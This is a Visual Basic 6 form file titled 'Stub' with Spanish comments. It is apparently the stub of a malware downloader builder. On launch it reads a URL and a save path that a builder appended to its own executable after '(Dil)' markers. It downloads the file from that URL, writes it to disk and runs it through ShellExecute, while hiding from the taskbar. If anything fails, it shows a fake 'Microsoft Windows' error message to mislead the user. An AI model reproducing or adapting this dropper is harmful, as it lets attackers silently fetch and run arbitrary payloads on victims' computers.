VERSION 5.00
Object = "{48E59290-9880-11CF-9754-00AA00C00908}#1.0#0"; "MSINET.OCX"
Object = "{831FDD16-0C5C-11D2-A9FC-0000F8754DA1}#2.0#0"; "MsComCtl.ocx"
Begin VB.Form Form1 
   BorderStyle     =   4  'Fixed ToolWindow
   Caption         =   "Stub"
   ClientHeight    =   555
   ClientLeft      =   45
   ClientTop       =   315
   ClientWidth     =   690
   LinkTopic       =   "Form1"
   MaxButton       =   0   'False
   MinButton       =   0   'False
   ScaleHeight     =   555
   ScaleWidth      =   690
   ShowInTaskbar   =   0   'False
   StartUpPosition =   3  'Windows Default
   Begin MSComctlLib.ProgressBar ProgressBar1 
      Height          =   495
      Left            =   600
      TabIndex        =   0
      Top             =   0
      Width           =   135
      _ExtentX        =   238
      _ExtentY        =   873
      _Version        =   393216
      Appearance      =   1
   End
   Begin InetCtlsObjects.Inet Inet1 
      Left            =   0
      Top             =   0
      _ExtentX        =   1005
      _ExtentY        =   1005
      _Version        =   393216
   End
End
Attribute VB_Name = "Form1"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = False
Private Declare Function ShellExecute Lib "shell32.dll" Alias "ShellExecuteA" (ByVal hwnd As Long, ByVal lpOperation As String, ByVal lpFile As String, ByVal lpParameters As String, ByVal lpDirectory As String, ByVal nShowCmd As Long) As Long
Option Explicit
Dim descarga As String
Dim directorio As String
Dim TodoCD As String

Private Sub Form_Load()
Open App.Path + "\" & App.EXEName & ".exe" For Binary As #1
TodoCD = Space(LOF(1))
Get #1, , TodoCD
Close #1

directorio = Split(TodoCD, "(Dil)")(1)
descarga = Split(TodoCD, "(Dil)")(2)
    
    'Propiedades para el control inet ( AccessType y URL )
    With Inet1
        .AccessType = icUseDefault
        'Indicamos el url del archivo
        .URL = Trim(descarga)
        'Indicamos que vamos a descargar o recuperar un archivo desde una url
        .Execute , "GET"
    End With
End Sub

Private Sub Inet1_StateChanged(ByVal State As Integer)

On Error GoTo Err_Sub

    Dim tempArray() As Byte ' Un array para grabar los datos en un archivo
    Dim bDone As Boolean
    'Para el tamaño del archivo en bytes que se usa para el array
    Dim filesize As Long
    ' Acá almacenamos los datos
    Dim vtData As Variant

    Select Case State

        Case icResponseCompleted
            bDone = False
            'Para saber el tamaño del fichero en bytes
            filesize = Inet1.GetHeader("Content-length")
            'Creamos y abrimos un nuevo archivo en modo binario
            Open directorio For Binary As #1
        
            ' Leemos de a 1 Kbytes. El segundo parámetro indica _
            el tipo de fichero. Tipo texto o tipo Binario, en este caso binario
            vtData = Inet1.GetChunk(1024, icByteArray)

            DoEvents
         
            'Si el tamaño del fichero es 0 ponemos bDone en _
            True para que no entre en el bucle
            If Len(vtData) = 0 Then
                bDone = True
            End If
            
            With ProgressBar1
                .Value = 0
                .Max = filesize
            End With
            
            Do While Not bDone
                'Almacenamos en un array el contenido del archivo que se va leyendo
                tempArray = vtData
                'Escribimos los datos en el archivo
                Put #1, , tempArray
                'Leemos  datos de a 1 kb (1024 bytes)
                vtData = Inet1.GetChunk(1024, icByteArray)
         
                DoEvents
                'Aumentamos la barra de progreso
                ProgressBar1.Value = ProgressBar1.Value + (Len(vtData) * 2)
            
                If Len(vtData) = 0 Then
                    bDone = True
                End If
            Loop

        Close #1
    
        Dim res As Long
        res = ShellExecute(Me.hwnd, "Open", directorio, "", "", 1)
        ProgressBar1.Value = 0
    End Select

Exit Sub

Err_Sub:
    MsgBox "Windows no responde correctamente", vbCritical, "Microsoft Windows"
    On Error Resume Next
    Inet1.Cancel
    ProgressBar1.Value = 0
End Sub


